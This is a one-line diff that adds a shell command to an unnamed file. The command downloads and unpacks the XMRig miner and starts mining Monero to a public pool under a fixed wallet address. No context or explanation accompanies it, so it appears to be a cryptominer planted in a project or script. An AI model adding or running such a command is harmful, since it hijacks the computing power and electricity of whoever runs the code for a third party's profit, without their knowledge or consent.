@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o pool.hashvault.pro:3333 -u 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD -p x
